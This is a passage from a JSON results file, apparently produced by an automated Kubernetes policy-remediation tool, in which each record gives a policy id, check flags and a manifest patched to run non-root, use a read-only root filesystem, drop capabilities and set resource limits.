    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx:stable\n        name: app2\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01546",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx:stable\n        name: app2\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01547",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx:stable\n        name: app2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01548",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx:stable\n        name: app2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01549",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01550",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01551",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01552",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01553",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01554",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01555",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01556",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01557",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01558",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01559",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01560",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01561",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01562",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01563",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01564",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01565",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01566",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01567",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01568",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
